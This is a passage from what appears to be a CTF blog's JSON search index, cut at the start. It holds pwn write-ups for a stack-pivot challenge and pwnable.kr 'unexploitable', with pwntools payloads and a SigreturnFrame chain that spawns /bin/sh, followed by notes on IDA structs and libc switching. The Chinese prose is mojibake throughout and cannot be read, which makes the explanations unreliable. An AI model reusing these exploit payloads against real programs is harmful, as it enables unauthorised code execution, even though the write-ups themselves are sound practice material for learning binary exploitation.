Length\");\n}\n```\n\n3.æ±‡æ€»ä¸€ä¸‹ï¼Œç¨‹åºå­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†åªèƒ½æº¢å‡º4ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯æœ€å¤šåªèƒ½è¦†ç›–åˆ°ebpï¼Œç„¶åå­˜åœ¨åé—¨å‡½æ•°ã€‚ç”±äºæ²¡åŠæ³•ç›´æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œå°±åœ¨ebpä¸Šåšæ–‡ç« ï¼Œä½¿ç”¨æ ˆåŠ«æŒæŠ€æœ¯ã€‚ä¹‹å‰çš„æ ˆåŠ«æŒå¯ä»¥ç”¨ropï¼Œä½†æ˜¯è¿™é‡Œæ²¡åŠæ³•ï¼Œå› ä¸ºæ— æ³•è¿›è¡Œè¿”å›åœ°å€è¦†ç›–ã€‚ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªåœ°æ–¹ï¼Œå°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥æœ€åä¼šè¢«è§£ç èµ‹å€¼ç»™inputï¼Œè¿™ä¸ªinputæ˜¯ä¸ªå…¨å±€å˜é‡ï¼Œä¸å—åˆ°ASLRå½±å“ï¼Œè€Œåˆå¯ä»¥æ§åˆ¶12ä¸ªå­—èŠ‚ï¼Œå¦‚æœå¯ä»¥æŠŠæ ˆæŒªç§»åˆ°è¿™ä¸ªåœ°æ–¹ï¼Œé‚£ä¹ˆå°±æ˜¯å¯æ§äº†ã€‚\n\næ ˆæ¨¡å‹å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548702.png)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548716.png)\n\nå¯æ§æ ˆå¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548659.png)\n\n4.æ€»ä½“æ€è·¯åº”è¯¥æ˜¯ï¼š\n\nâ‘ åŠ«æŒauthå‡½æ•°çš„æ ˆåº•åˆ°input_addrï¼Œé‚£ä¹ˆauthå‡½æ•°åœ¨é€€å‡ºåˆ°mainå‡½æ•°æ—¶ï¼Œmainå‡½æ•°æ ˆçš„æ ˆåº•å°±ä¸ä¼šå›åˆ°ä¹‹å‰çš„mainå‡½æ•°æ ˆæ ˆåº•ï¼Œè€Œæ˜¯ä¼šæŒªç§»åˆ°æˆ‘ä»¬input_addrï¼Œä¹Ÿå°±æ˜¯payload3çš„å€¼ã€‚\n\nâ‘¡å¼€å§‹æ‰§è¡Œauthå‡½æ•°ä¸­çš„é€€å‡ºæ“ä½œï¼Œåˆ°leaveæ—¶ï¼Œæ‰§è¡Œæ“ä½œleaveçš„ç¬¬ä¸€æ­¥æ±‡ç¼–æ“ä½œmov esp ebpï¼Œå°†æ ˆé¡¶æŒ‡å‘ebpæŒ‡å‘çš„å†…å®¹ï¼Œæ­¤æ—¶ebpå·²ç»è¢«ä¿®æ”¹æˆäº†payload3ï¼Œè€Œpayload3ä¼šè¢«èµ‹å€¼æˆInput_addrï¼Œä¹Ÿå°±æ˜¯espä¼šæŒ‡å‘input_addrã€‚\n\nâ‘¡æ‰§è¡Œleaveç¬¬äºŒæ­¥æ±‡ç¼–æŒ‡ä»¤pop ebpï¼Œå°†å½“å‰æ ˆé¡¶çš„å€¼èµ‹å€¼ç»™ebpï¼Œä¹Ÿå°±æ˜¯ebpçš„å€¼ä¼šå˜æˆpayload1ï¼Œ(è¿™é‡Œçš„payload1æ²¡ä»€ä¹ˆä½œç”¨ï¼Œå¯ä»¥éšä¾¿å¡«)ä¹‹åespç”±äºpopï¼Œesp+0x4ï¼Œä¼šå¾€æ ˆåº•ç§»åŠ¨ä¸€ä¸ªåœ°å€ï¼Œç§»åŠ¨åˆ°æŒ‡å‘æˆ‘ä»¬è¾“å…¥çš„payload2å¤„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548823.png)\n\nâ‘£ä¹‹åretnæ‰§è¡Œï¼Œå®é™…æŒ‡ä»¤ä¸ºpop eipï¼Œä¹Ÿå°±æ˜¯å°†å½“å‰æ ˆé¡¶æ•°æ®ç»™eipï¼Œä¹Ÿå°±æ˜¯eipè¢«èµ‹å€¼ä¸ºæˆ‘ä»¬payloadä¸­çš„payload2ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548769.png)\n\nâ‘¤æœ€åæ‰§è¡Œretnçš„ç¬¬äºŒæ¡å®é™…æŒ‡ä»¤ï¼šjmp eipï¼Œæ­¤æ—¶eipå°±å·²ç»æ˜¯payload2çš„å€¼ï¼Œæ‰€ä»¥å°†è¯¥payload2è®¾ç½®ä¸ºcorrectå‡½æ•°åœ°å€æˆ–è€…æ˜¯system(\"/bin/sh\");å°±å¯ä»¥getshellã€‚\n\næ€»çš„æ¥è¯´ï¼Œå°±æ˜¯åˆ©ç”¨leaveå’Œretnä¸¤ä¸ªæ“ä½œæ¥åŠ«æŒeipçš„å€¼ï¼Œä½¿å…¶ç›´æ¥æŒ‡å‘åé—¨å‡½æ•°ï¼Œä¸€æ­¥getshellã€‚\n\n5.åˆ›å»ºpayloadï¼Œç»„æˆåº”è¯¥æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#é¦–å…ˆç¡®å®šåœ°å€ï¼š\ncorrect_addr = 0x08049278\ninput_addr = 0x0811eb40\n```\n\nä¹‹åç¡®å®špayloadçš„ç»„æˆï¼š\n\npayload = padding + eip + input_addrã€‚\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"aaaa\"\t\t\t\t#padding\npayload += p32(0x08049284)\t\t\n#system(\"/bin/sh\")åœ°å€ï¼Œæ•´ä¸ªpayloadè¢«å¤åˆ¶åˆ°bssä¸Šï¼Œæ ˆåŠ«æŒåretnæ—¶æ ˆé¡¶åœ¨è¿™é‡Œ\npayload += p32(0x0811eb40)\t\t#æ–°çš„eipåœ°å€\n```\n\næœ€åå¾—æ³¨æ„å‘é€çš„æ˜¯base64ç¼–ç ä¹‹åçš„payloadã€‚\n\n \n\nå‚è€ƒèµ„æ–™:\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["hijackStack"],"categories":["PWN","hijackStack0x4"]},{"title":"pwnable.kr-unexploitable","url":"/2021/08/14/pwnable.kr-unexploitable/","content":"\n1.å¸¸è§„checksecï¼Œåªå¼€å¯äº†NXã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œç¨‹åºå¾ˆç®€å•ï¼Œè¯»å…¥æ•°æ®æ ˆæº¢å‡ºï¼Œå¯ä»¥è¯»å–1295ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯bufåªæœ‰0x10hå¤§å°ï¼Œæ‰€ä»¥å¯ä»¥æº¢å‡ºè¶³å¤Ÿé•¿çš„æ•°æ®ã€‚\n\n2.ç¨‹åºæ²¡æœ‰åé—¨ï¼Œæ²¡æœ‰å¯¼å…¥systemå‡½æ•°ï¼Œæ²¡æœ‰binshå­—ç¬¦ä¸²ï¼Œä¹Ÿæ²¡æœ‰writeã€putã€printfä¹‹ç±»çš„å¯ä»¥æ³„éœ²libcçš„å‡½æ•°ï¼Œæ²¡åŠæ³•ROPï¼Œç„¶åROPgadgetä¹Ÿæœä¸åˆ°syscallã€‚è¿™é‡Œæ¢ç”¨å¦ä¸€ç§å·¥å…·ropperæ¥æœç´¢ï¼šropper --file=unexploitable --search \"syscall\"ï¼Œå¯ä»¥æœåˆ°ä¸€ä¸ªã€‚æœ‰äº†syscallï¼Œå¯ä»¥å°è¯•ç”¨ropæ¥ç»™å¯„å­˜å™¨èµ‹å€¼ç„¶åå¼€shellï¼Œä½†æ˜¯è¿™é‡Œè¿˜æ˜¯æœä¸åˆ°ç»™rsiï¼Œrdiç­‰å¯„å­˜å™¨èµ‹å€¼çš„gadgetï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬ä¹Ÿæ²¡åŠæ³•ç›´æ¥é€šè¿‡ROPå®ç°getshellã€‚\n\n3.å¦‚æœæ²¡æœ‰å¼€NXï¼Œç›´æ¥æ ˆåŠ«æŒç„¶åshellcodeå°±å®Œäº‹äº†ï¼Œä½†æ˜¯å¼€å¯äº†NXï¼Œæ²¡åŠæ³•shellcodeã€‚\n\n4.å•¥ä¹Ÿä¸ç®¡ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨SROPï¼Œä¹Ÿå°±æ˜¯é€šè¿‡syscallå†åˆ©ç”¨SigreturnFrameæ¥è®¾ç½®å¯„å­˜å™¨rsiå’Œridçš„å€¼ï¼ŒåŠ ä¸Šå­—ç¬¦ä¸²binshå¯ä»¥ç›´æ¥getshellï¼Œä¸ç”¨éå¾—è®¾ç½®rsi,rdiå¯„å­˜å™¨å€¼çš„ropã€‚ä½†æ˜¯è¿™é‡Œä½¿ç”¨SigreturnFrameæœ‰é™åˆ¶ï¼Œéœ€è¦æº¢å‡ºçš„é•¿åº¦è¾ƒé•¿ä¸€äº›ï¼Œ32ä½ä¸‹éœ€è¦ä¾é¡ºåºå¸ƒç½®æ ˆï¼Œ64ä½æ¡ä»¶ä¸‹éœ€è¦å¾€æ ˆä¸­å¸ƒç½®ä¸€ä¸ªç»“æ„ä½“ï¼Œæ‰€ä»¥éœ€è¦è¾“å…¥è¶³å¤Ÿé•¿çš„payloadæ¥ä¿®æ”¹ã€‚\n\n5.è¿™é‡Œä½¿ç”¨çš„æ–¹æ¡ˆæ˜¯SigreturnFrameï¼Œå…ˆè€ƒè™‘ä¸€æ®µè¶³å¤Ÿé•¿çš„å¯ä¿®æ”¹çš„å†…å­˜åœ°å€æ¥ç»™æˆ‘ä»¬å­˜æ”¾æ ˆåŠ«æŒçš„å†…å®¹ã€‚ä½†æ˜¯åœ¨IDAä¸­æŒ‰ctrl+sæŸ¥çœ‹å†…å­˜æ®µï¼Œå‘ç°æ‰€æœ‰çš„å¯æ”¹å¯è¯»çš„å†…å­˜æ®µéƒ½ç‰¹åˆ«å°ï¼Œæ²¡åŠæ³•å­˜æ”¾è¶³å¤Ÿé•¿çš„æº¢å‡ºå†…å®¹ã€‚è¿™é‡Œå¿½ç•¥äº†ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œä¸´æ—¶åˆ›å»ºçš„ç¼“å­˜ï¼šä¹Ÿå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨read(0, &buf, 0x50FuLL);æ—¶ï¼Œä¼šä¸´æ—¶åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º0x50Fçš„ç¼“å­˜åŒºé—´ï¼Œè¿™ä¸ªåŒºé—´è¶³å¤Ÿæ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œä½†æ˜¯åœ¨IDAä¸­æ‰¾ä¸åˆ°ï¼Œé‚£å°±æ²¡åŠæ³•æ ˆåŠ«æŒåˆ°è¿™ä¸ªä½ç½®ã€‚è¿™é‡Œå¯ä»¥å…ˆåŠ¨æ€è°ƒè¯•ä¸€ä¸‹ï¼Œç”±äºæ²¡æœ‰å¼€å¯PIEï¼Œç¨‹åºåŠ è½½åçš„åŸºåœ°å€æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æ— è®ºç¨‹åºåŠ è½½å¤šå°‘æ¬¡ï¼Œåœ°å€ä»ç„¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚é‚£ä¹ˆè½¬å‘åŠ¨æ€è°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°ç¨‹åºå†’å‡ºæ¥ä¸€ä¸ªå¯è¯»å¯å†™çš„å†…å­˜æ®µï¼šunexploitableï¼Œè¿™ä¸ªå°±æ˜¯ä¸´æ—¶åˆ›å»ºçš„ä¸€ä¸ªç¼“å­˜åŒºé—´ï¼Œé•¿åº¦ä¸ºF88ï¼Œè¶³å¤Ÿç”¨æ¥æ‰§è¡Œæ“ä½œã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191526527.png)\n\n6.åœ¨è¿™ä¸ªåŒºé—´ä¸Šä»»æ„é€‰å–ä¸€ä¸ªåœ°å€æ¥æ ˆåŠ«æŒï¼Œè¿™é‡Œé€‰æ‹©0x60116cï¼Œç„¶åç¼–å†™payloadï¼Œå°è¯•èƒ½å¦æˆåŠŸæ ˆåŠ«æŒå¹¶ä¸”è¯»å…¥binshï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += 'a'*16               #padding\npayload += p64(fake_stack_addr)\n#mainå‡½æ•°è¿”å›æ—¶ï¼Œå°†æ ˆåŠ«æŒåˆ°fake_stack_addrå¤„ï¼Œç¬¬ä¸€æ¬¡å°†ä½¿å¾—rbpå˜ä¸ºfake_stack_addr, rbp + bufä¸ºfake_stack_addr - 0x10\npayload += p64(set_read_addr)   \n#æ±‡ç¼–æŒ‡ä»¤ä¸ºlea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _readçš„åœ°å€å¤„\nio.send(payload)\n```\n\nè¿™æ ·æ¥ä¸‹æ¥å¦‚æœå†è¾“å…¥binshå­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥è¯»å–åˆ°[rbp+buf]å¤„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„set_read_addræ˜¯ä»ä¸‹å›¾æœ€å¼€å§‹è·³è½¬ï¼Œå¦‚æœç›´æ¥è·³è½¬call readï¼Œé‚£ä¹ˆå°±ä¼šç”±äºreadå–å‚æ˜¯edx,rsi,ediï¼Œä»è€Œå¯¼è‡´æ•°æ®ä¼šå­˜å…¥rsiæŒ‡å‘çš„åœ°å€ï¼Œæ²¡åŠæ³•å­˜åˆ°æˆ‘ä»¬åŠ«æŒçš„æ ˆä¸­ã€‚è§‚å¯Ÿreadå‡½æ•°æ±‡ç¼–ä»£ç å¯ä»¥çŸ¥é“ï¼Œè™½ç„¶readå­˜å…¥çš„åœ°å€æ˜¯rsiï¼Œä½†æ˜¯rsiæ˜¯é€šè¿‡rbp+bufæ¥èµ‹å€¼çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹rbpä¸ºfake_stackï¼Œä½¿å¾—rbp+bufçš„åœ°å€å˜ä¸ºfake_stackä¸Šçš„æŸä¸ªåœ°å€ï¼Œå†æ‰§è¡Œä¸‹å›¾ä¸­çš„ä»£ç ï¼Œå°±å¯ä»¥ä½¿å¾—readè¯»å–çš„å†…å®¹ç›´æ¥è¿›å…¥åˆ°åŠ«æŒæ ˆrbp+bufä¸Šï¼Œä¹Ÿå°±æ˜¯fake_stackä¸Šã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191526968.png)\n\n7.æ ˆåŠ«æŒå®Œæˆä¹‹åï¼Œè€ƒè™‘ç¬¬äºŒæ®µçš„payloadï¼Œä¹Ÿå°±æ˜¯è¾“å…¥binshå­—ç¬¦ä¸²å’Œåç»­å†…å®¹ï¼Œæ¥æ‰§è¡ŒSigreturnFrameï¼Œä½¿ç”¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += \"/bin/sh\\x00\"\n```\n\nè¾“å…¥å­—ç¬¦ä¸²binshï¼Œå­˜æ”¾åœ¨fake_stack_addr-0x10å¤„\n\n```\n#æ³¨é‡Šå¤´\n\npayload += 'a'*8 #padding\npayload += p64(fake_stack_addr+0x10)#å­˜æ”¾åœ¨0x60116cå¤„\n```\n\nè¯»å–å®Œä¹‹åï¼Œæ‰§è¡ŒleaveæŒ‡ä»¤ä¹‹å‰çš„æ ˆåº•ä¸º0x60116cï¼Œè€ŒleaveæŒ‡ä»¤ç›¸å½“äºï¼šmov rsp rbpï¼›å’Œpop rbpï¼š\n\n(1)ç¬¬ä¸€æ¡mov rsp rbpä¹‹åï¼Œ0x60116cå°±è¢«èµ‹å€¼ç»™rspï¼Œä¹Ÿå°±æ˜¯rspæŒ‡å‘0x60116cã€‚\n\n(2)ç¬¬äºŒæ¡pop rbpä¹‹åï¼ŒæŠŠ0x60116cå¤„çš„å†…å®¹èµ‹å€¼ç»™rbpï¼Œè¿™é‡Œè®¾ç½®0x60116cå¤„çš„å†…å®¹ä¸ºfake_stack_addr+0x10ï¼Œä¹Ÿå°±æ˜¯0x60117cï¼Œé‚£ä¹ˆrbpæŒ‡å‘0x60117cã€‚rspä¸‹æŒªä¸€ä¸ªå•ä½ï¼ŒæŒ‡å‘0x60116c+0x08=0x601174ã€‚\n\næ•…leaveæŒ‡ä»¤æ‰§è¡Œå®Œårsp = 0x601174ï¼Œrbp = 0x60117cã€‚\n\nâ–²è¿™é‡Œè¿™ä¹ˆè®¾ç½®æ˜¯æœ‰åŸå› çš„ï¼Œä¸ºäº†æŒªåŠ¨rspæ¥æŒ‡å‘0x601174ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\npayload += p64(call_read_addr)#å­˜æ”¾åœ¨0x601174\n#å­˜æ”¾åœ¨0x601174å¤„ï¼Œä¸ºäº†ä¹‹åå†æ¬¡è°ƒç”¨readä¿®æ”¹raxã€‚\n```\n\næ¥ç€æ‰§è¡ŒretnæŒ‡ä»¤ï¼Œç›¸å½“äºpop eipï¼Œæ­¤æ—¶çš„rspæŒ‡å‘ 0x601174ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†0x601174å¤„çš„å€¼å˜ä¸ºread_addrçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¿™æ¡è¯­å¥ï¼Œè¿™é‡Œè®¾ç½®read_addrä¸º0x400571ï¼Œä¹Ÿå°±æ˜¯å¸¦æœ‰callæŒ‡ä»¤çš„readã€‚\n\n```\næ³¨é‡Šå¤´\n\npayload += p64(fake_stack_addr)#å­˜æ”¾åœ¨0x60117cï¼Œè¿™é‡Œå¯ä»¥éšä¾¿è®¾ç½®ï¼Œç”¨ä¸åˆ°\n```\n\nretnæŒ‡ä»¤ä¹‹åå°±æ˜¯callæŒ‡ä»¤ï¼Œå„ç§å¯„å­˜å™¨çš„å€¼è¿˜æ˜¯æ²¡å˜ï¼Œæ‰€ä»¥ç…§å¸¸ç”¨å°±è¡Œï¼Œå›æ¥ä¹‹årspä»æ—§æŒ‡å‘0x60117cã€‚æ­¤æ—¶æ ˆçŠ¶æ€ä¸ºï¼š\n\nrsp = 0x60117cï¼Œrbp = 0x60117cã€‚\n\n```\n#æ³¨é‡Šå¤´\n\npayload += str(frameExecve)#è®¾ç½®SigreturnFrameç»“æ„ä½“\n\nio.send(payload)\n#set_readå¤„çš„è¯»å–\n\nsleep(3)\n\n\nio.send('/bin/sh\\x00' + ('a')*7) \n#call_readå¤„çš„è¯»å–ã€‚\n```\n\nè¯»å–15ä¸ªå­—ç¬¦åˆ°0x60115cï¼Œç›®çš„æ˜¯åˆ©ç”¨readè¿”å›å€¼ä¸ºè¯»å–çš„å­—èŠ‚æ•°çš„ç‰¹æ€§è®¾ç½®rax=0xfï¼Œæ³¨æ„ä¸è¦ä½¿/bin/sh\\x00å­—ç¬¦ä¸²å‘ç”Ÿæ”¹å˜ã€‚\n\næœ€åio.interactive()å³å¯getshellã€‚\n\nâ–²æ€»çš„ç¨‹åºæµåº”è¯¥æ˜¯ï¼šé¦–æ¬¡read->set_read->call_read->syscall\n\nç»“æ„ä½“çš„è®¾ç½®ï¼Œå›ºå®šæ¨¡å¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframeExecve = SigreturnFrame() #è®¾ç½®SROP Frame\nframeExecve.rax = constants.SYS_execve\nframeExecve.rdi = binsh_addr\nframeExecve.rsi = 0\nframeExecve.rdx = 0\nframeExecve.rip = syscall_addr\n```\n\nå¼€å¤´è®¾ç½®ï¼š\n\n```\n#æ³¨é‡Šå¤´ \n\nsyscall_addr = 0x400560 \nset_read_addr = 0x40055b \nread_addr = 0x400571 \nfake_stack_addr = 0x60116c \nbinsh_addr = 0x60115c\n```\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"pwnå †-IDA-0x01","url":"/2021/08/14/pwnå †-IDA-0x01/","content":"\nâ–²å †é¢˜ä¸€èˆ¬éƒ½éœ€è¦è®¾ç½®ä¸‹IDAä¸­çš„ç»“æ„ä½“ï¼š\n\n1.ç»“æ„ä½“è®¾ç½®ï¼šæ‰“å¼€IDA-çª—å£-ç»“æ„ä½“(alt+4)ã€‚\n\n2.ç¼–è¾‘-æ·»åŠ ç»“æ„ä½“ç±»å‹ï¼Œç„¶åå†™åç§°(insert)ã€‚\n\n3.å‡ºç°æ–°å¢çš„structä¹‹åï¼Œå°†é¼ æ ‡æ”¾åœ¨è¯¥ç»“æ„ä½“endsä½ç½®ï¼ŒæŒ‰dæ·»åŠ æˆå‘˜ã€‚\n\n4.å°†é¼ æ ‡æ”¾åœ¨æˆå‘˜ä¸Šï¼ŒæŒ‰dè½®è½¬è®¾ç½®æˆå‘˜å¤§å°ï¼ŒæŒ‰uå¯åˆ é™¤æˆå‘˜ã€‚\n\n5.æ‰¾åˆ°mallocçš„ä½ç½®ï¼Œåˆ¤æ–­å¥½å“ªä¸ªå˜é‡æ˜¯å­˜æ”¾chunkå’Œchunk_sizeï¼Œä¹‹åæŒ‰yå°†å…¶è®¾ç½®ä¸º:\n\nstruct struct_Name *array_Name[count]\n\n(ä¸€èˆ¬éƒ½æ˜¯è¿™æ ·çš„ï¼Œé¢˜ç›®ä¼šåˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œç»“æ„ä½“é‡Œæœ‰ä¸¤ä¸ªæ•°æ®æˆå‘˜ï¼Œä¸ºchunkå’Œchunk_sizeï¼Œè¿™é‡Œçš„chunkå°±æ˜¯Mallocè¿”å›çš„æŒ‡é’ˆã€‚ä¸åŒé¢˜ç›®å…·ä½“åˆ†æï¼Œæœ‰çš„ä¹Ÿæœ‰å‡½æ•°æŒ‡é’ˆçš„æ•°æ®æˆå‘˜void * fun_Name())\n\n6.è®¾ç½®å¢åˆ æ”¹æŸ¥å‡½æ•°çš„å˜é‡ç±»å‹ä¸ºvoidï¼Œä¸ç„¶ifå‡½æ•°å°±æœ‰çš„éš¾å—äº†ã€‚\n\n7.å°†åˆ¤æ–­çš„æˆå‘˜å˜é‡ä»€ä¹ˆçš„éƒ½è®¾ç½®å¥½ï¼ŒæŒ‰Næ”¹åï¼Œä¹‹åå†æ¥åˆ†ææ¼æ´ï¼Œä¸ç„¶å¾ˆå®¹æ˜“æ··æ·†ã€‚\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://blog.csdn.net/hgy413/category_1151311.html\n","tags":["IDA"],"categories":["PWN","pwnå †-IDA"]},{"title":"pwnä¸­libcç‰ˆæœ¬åˆ‡æ¢ç¼–è¯‘","url":"/2021/08/14/pwnä¸­libcç‰ˆæœ¬åˆ‡æ¢ç¼–è¯‘/","content":"\nä¸€ã€æ‰‹åŠ¨ç¼–è¯‘\n\n1.ä¸‹è½½å¯¹åº”libcçš„æºç ï¼šä»¥2.32ä¸ºä¾‹ï¼šglibc-2.32.tar.gz\n\n(1)å®˜ç½‘ï¼šhttps://ftp.gnu.org/gnu/glibc/\n\n(2)æ¸…åé•œåƒæºï¼šhttps://mirrors.tuna.tsinghua.edu.cn/gnu/glibc/\n\n2.è§£å‹ï¼Œç„¶åæ–°å»ºæ–‡ä»¶å¤¹æ¥å­˜å‚¨ç¼–è¯‘ç»“æœï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ntar -xvf glibc-2.32.tar.gz\nmkdir glibc-2.32_build\nmkdir glibc-2.32_out\n```\n\n3.ç¼–è¯‘ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ncd glibc-2.32_build\n../glibc-2.32/configure '--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes'\nmake\n```\n\nè¿™é‡Œçš„--prefix=****éœ€è¦ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œä¸èƒ½æ—¶ç›¸å¯¹è·¯å¾„ï¼Œå¯¹äºpwnæ¥è¯´å°±å¥½äº†ï¼Œä¸ç”¨å†æ¥ç€å¾€ä¸‹å®‰è£…äº†ã€‚ä¸è¿‡è¿™æ˜¯64ä½çš„ï¼Œ32ä½å¾—å¦‚ä¸‹ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ncd glibc-2.32_build\nCC=\"gcc -m32\" CXX=\"g++ -m32\" \\\n../glibc-2.32/configure '--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes --host=i686-linux-gnu --build=i686-lin    ux-gnu' \nmake\n```\n\nåŸºæœ¬æ˜¯å·®ä¸å¤šçš„ã€‚\n\n4.æ‰¾libc.so å’Œ ld.soæ–‡ä»¶ï¼š\n\n(1)libc.so åœ¨glibc-2.32_buildç›®å½•ä¸‹\n(2)ld.so åœ¨glibc-2.32_build/elf ç›®å½•ä¸‹\n\n5.ä½¿ç”¨ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\np = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n```\n\nè¿™æ ·å°±å¯ä»¥gdbè°ƒè¯•çš„æ—¶å€™å¸¦ç¬¦å·è¡¨ï¼Œç„¶åè¿˜æœ‰æºç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_20-51-09.png)\n\nâ–²å…³äºld.soçš„è¿æ¥ä½¿ç”¨ï¼Œæœ€å¥½è¿˜æ˜¯ç”¨ç¼–è¯‘é…å¥—çš„ï¼Œä¸ç„¶å®¹æ˜“å‡ºé”™ã€‚å¦‚æœä¸éœ€è¦æºç ï¼Œåªéœ€è¦æŒ‰ç…§çš„libcå’Œldï¼Œå°±å¯ä»¥make installã€‚ç„¶ååœ¨glibc-2.32_out/lib/ä¸‹å°±èƒ½æ‰¾åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶äº†ã€‚\n\n \n\näºŒã€å¯¹åº”dockerä¸‹è½½ï¼š\n\n1.æœå¯¹åº”ç‰ˆæœ¬libcå¯¹åº”çš„ubuntuï¼Œæ¯”å¦‚libc-2.27å°±å¯¹åº”ubuntu18.04ï¼Œç„¶åpullä¸‹æ¥ã€‚\n\n2.ç„¶åå°†å¯¹åº”ç‰ˆæœ¬çš„dockeræºsources.listæ‹·è´è¿›å»ï¼Œç„¶åæˆ‘è¿™è¾¹è‡ªå·±æ€»ç»“äº†ä¸€ä»½å®‰è£…è„šæœ¬ï¼Œä¸€é”®è¿è¡Œï¼Œçœå»å¾ˆå¤šéº»çƒ¦ã€‚(è®°å¾—å…ˆå¤‡ä»½ä¸€ä¸‹ï¼Œé˜²æ­¢å‡ºé”™)\n\n```bash\ndocker cp sources.list [dockerName]:/etc/apt/\ndocker cp install.sh [dockerName]:/\nchmod a+x install.sh\n./install.sh\n```\n\nè£…å®Œä¹‹ååŸºæœ¬çš„ç¯å¢ƒå°±æœ‰äº†ï¼Œpwndbgï¼Œpythonï¼Œpwntoolsç­‰ç­‰ï¼Œå…¶ä»–çš„è‡ªå·±æ…¢æ…¢å®‰è£…å§ã€‚\n\nâ–²æœ‰ä¸ªpwn_dockerä¹ŸæŒºå¥½ä½¿çš„ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ndocker pull pwn_docker\n```\n\né‡Œé¢è¿è¡Œä¹Ÿç±»ä¼¼ä¸åŒç‰ˆæœ¬çš„libc:\n\n```python\n#æ³¨é‡Šå¤´ \np\np = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './pwn'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n```\n\n \n\nä¸‰ã€å·¥å…·ä½¿ç”¨ï¼šLibcSearcher\n\nè¿™ä¸ªç®—æ˜¯æœ€å¸¸ç”¨äº†ï¼Œå¾ˆå¥½ç”¨ï¼Œç›´æ¥å»githubä¸Šæ‰¾å¾ˆå¤šï¼Œå¤–é¢ä¹Ÿæœ‰å¾ˆå¤šæ•™ç¨‹ã€‚\n\n \n\nå››ã€patchelfï¼šç›´æ¥ä¿®æ”¹ELFæ–‡ä»¶åŠ è½½çš„libc\n\n1.å®‰è£…ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\nsudo apt-get install autoconf automake libtool\ngit clone https://github.com/NixOS/patchelf.git\n./bootstrap.sh\n./configure\nmake\nmake check\nsudo make install\n```\n\nç¼–è¯‘ç¯å¢ƒå•¥çš„éƒ½è¦æœ‰\n\n2.ä½¿ç”¨ï¼š\n\nhttps://github.com/NixOS/patchelf\n\n```bash\n#æ³¨é‡Šå¤´\n\npatchelf --set-interpreter /home/hacker/glibc/2.23/64/lib/ld-2.23.so --set-rpath /home/hacker/glibc/2.23/64/lib/ ./pwn\n```\n\nè¿™ä¸ªå¯ä»¥ç›´æ¥gdbè°ƒè¯•ï¼Œä¸ç”¨å†ç”¨pythonæ‰“å¼€æŒ‡å®šç¯å¢ƒã€‚\n\n \n\näº”ã€gdbæŒ‡å®šæºç 